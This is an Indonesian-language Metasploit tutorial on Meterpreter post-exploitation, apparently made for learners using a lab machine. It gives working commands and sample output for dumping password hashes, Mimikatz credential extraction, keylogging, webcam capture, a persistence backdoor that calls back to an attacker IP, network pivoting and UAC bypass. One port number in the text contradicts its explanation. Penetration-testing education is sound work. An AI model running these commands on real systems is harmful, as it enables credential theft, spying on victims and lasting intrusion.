# Post-Exploitation di Metasploit

## A. Apa Itu Post-Exploitation?

[Post-Exploitation](https://en.wikipedia.org/wiki/After_Exploitation) adalah tahap lanjutan setelah berhasil mendapatkan akses ke sistem target. Di Metasploit, khususnya dengan Meterpreter session, kamu bisa melakukan berbagai aktivitas lanjutan untuk `mengumpulkan informasi`, `memperluas akses`, hingga `mengambil alih sistem` secara penuh.

## B. Konsep Dasar Meterpreter

[Meterpreter](https://doubleoctopus.com/security-wiki/threats-and-tools/meterpreter/) adalah payload berbasis memory injection yang powerful, interaktif, dan tidak menulis file ke disk (stealthy). Setelah exploit berhasil, Meterpreter menyediakan antarmuka CLI untuk post-exploitation.

## C. Perintah Dasar Meterpreter

| Perintah	| Fungsi |
|:--:|:--:|
| `sysinfo`	| Melihat informasi sistem target |
| `getuid` | Menampilkan User ID (UID) |
| `ps` | Menampilkan proses yang sedang berjalan |
| `shell`	| Membuka command shell dari mesin target |
| `getprivs` | Menampilkan privilege yang dimiliki |
| `getsystem`	| Mencoba escalate privilege jadi SYSTEM |
| `screenshot` | Mengambil tangkapan layar target |

Untuk melihat semua perintah yang ada di Meterpreter gunakan perintah `help`.

## D. Dump Password Hash

### 1. Secara Otomatis dengan `hashdump`:

   ```
   hashdump
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > hashdump 
   admin:1001:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
   Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
   HomeGroupUser$:1002:aad3b435b51404eeaad3b435b51404ee:691476ca8d6485699f3ca2ba1baa14e8:::
   ```

### 2. Atau Menggunakan Mimikatz:

   ```
   load kiwi
   kiwi_cmd sekurlsa::logonpasswords
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > load kiwi 
   Loading extension kiwi...
     .#####.   mimikatz 2.2.0 20191125 (x64/windows)
    .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
    ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
    ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
    '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
     '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

   Success.
   meterpreter > kiwi_cmd sekurlsa::logonpasswords

   Authentication Id : 0 ; 997 (00000000:000003e5)
   Session           : Service from 0
   User Name         : LOCAL SERVICE
   Domain            : NT AUTHORITY
   Logon Server      : (null)
   Logon Time        : 5/10/2025 1:08:48 PM
   SID               : S-1-5-19
	   msv :	
	   tspkg :	
	   wdigest :	
	    * Username : (null)
	    * Domain   : (null)
	    * Password : (null)
	   kerberos :	
	    * Username : (null)
	    * Domain   : (null)
	    * Password : (null)
	   ssp :	
	   credman :	

   Authentication Id : 0 ; 996 (00000000:000003e4)
   Session           : Service from 0
   User Name         : ADMIN-PC$
   Domain            : WORKGROUP
   Logon Server      : (null)
   Logon Time        : 5/10/2025 1:08:48 PM
   SID               : S-1-5-20
	   msv :	
	   tspkg :	
	   wdigest :	
	    * Username : ADMIN-PC$
	    * Domain   : WORKGROUP
	    * Password : (null)
	   kerberos :	
	    * Username : admin-pc$
	    * Domain   : WORKGROUP
	    * Password : (null)
	   ssp :	
	   credman :	

   Authentication Id : 0 ; 23597 (00000000:00005c2d)
   Session           : UndefinedLogonType from 0
   User Name         : (null)
   Domain            : (null)
   Logon Server      : (null)
   Logon Time        : 5/10/2025 1:08:46 PM
   SID               : 
	   msv :	
	   tspkg :	
	   wdigest :	
	   kerberos :	
	   ssp :	
	   credman :	

   Authentication Id : 0 ; 999 (00000000:000003e7)
   Session           : UndefinedLogonType from 0
   User Name         : ADMIN-PC$
   Domain            : WORKGROUP
   Logon Server      : (null)
   Logon Time        : 5/10/2025 1:08:46 PM
   SID               : S-1-5-18
	   msv :	
	   tspkg :	
	   wdigest :	
	    * Username : ADMIN-PC$
	    * Domain   : WORKGROUP
	    * Password : (null)
	   kerberos :	
	    * Username : admin-pc$
	    * Domain   : WORKGROUP
	    * Password : (null)
	   ssp :	
	   credman :
   ```

## E. Keylogger

### 1. Mulai keylogger:

   ```
   meterpreter > keyscan_start
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > keyscan_start 
   Starting the keystroke sniffer ...
   ```

### 2. Lihast Hasil:

   ```
   meterpreter > keyscan_dump
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > keyscan_dump 
   Dumping captured keystrokes...
   password login admin<Right Shift>: admin12345<^S>
   ```
### 3. Hentikan:

   ```
   meterpreter > keyscan_stop
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > keyscan_stop 
   Stopping the keystroke sniffer...
   ```

## F. Webcam (Ambil Gambar)

### 1. Cek webcam:

   ```
   webcam_list
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > webcam_list 
   1: VirtualBox Webcam - Integrated Camera: Integrated C
   ```

### 2. Ambil gambar:

   ```
   webcam_snap
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > webcam_snap
   [*] Starting...
   [+] Got frame
   [*] Stopped
   Webcam shot saved to: /root/yFrtbaER.jpeg
   ```

   Contoh gambar yang berhasil di capture dari webcam:

   ![](https://github.com/fixploit03/Belajar-Metasploit/blob/main/img/webcam%201.jpeg)

### 3. Atau rekam:

   ```
   webcam_stream
   ```

   Hasil output-nya seperti ini:

   ```
   meterpreter > webcam_stream
   [*] Starting...
   [*] Preparing player...
   [*] Opening player at: /root/JBcoFBUJ.html
   [*] Streaming...
   ```

   Contoh hasil stream webcam yang berhasil di record:

   ![](https://github.com/fixploit03/Belajar-Metasploit/blob/main/img/webcam%202.jpeg)

   > Ini hanya sample gambar.

## F. File & Data Collection

| Perintah | Fungsi |
|:--:|:--:|
| `ls`, `cd`, `pwd` | Navigasi file |
| `download <PATH_FILE>` | Unduh file dari target |
| `upload <PATH_FILE>` | Upload file ke target |
| `search -f *.docx` | Cari file tertentu |
| `cat <PATH_FILE>` | Lihat isi file|

## G. Persistence (Backdoor)

Contoh membuat persistence di Windows:

```
meterpreter > run persistence -U -i 5 -p 4444 -r 192.168.1.10
```

Keterangan:
- `-i`: Interval `5 detik`
- `-p`: Port listener: `4444`
- `-r`: IP Attacker: `192.168.1.10`

## H. Pivoting dan Port Forwarding

Jika target berada di jaringan internal, kamu bisa pivot ke sistem lain:

```
meterpreter > run autoroute -s 192.168.10.0/24
```

Keterangan:
- `-s` : (subnet) jaringan internal target: `192.168.10.0/24`

Gunakan port forwarding untuk akses service internal:

```
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.10.10
```

Keterangan:
- `-l`: Port listener: `8888`
- `-p`: Port tujuan di mesin target: `80`
- `-r`: IP target di jaringan internal korban yang akan diakses: `192.168.10.10`

## I. Privilege Escalation

Coba naikkan hak akses jadi `SYSTEM`:

```
meterpreter > getsystem
```

Atau gunakan exploit lokal seperti:

```
msf6 > use exploit/windows/local/bypassuac
```

## J. Kesimpulan

Post-exploitation adalah fase paling menentukan dalam operasi penetrasi. Dengan Meterpreter, kamu bisa:
- Mengumpulkan informasi sensitif
- Menanamkan backdoor
- Mengendalikan perangkat target secara penuh

> Pastikan semua aksi kamu terukur, tercatat, dan bertanggung jawab.
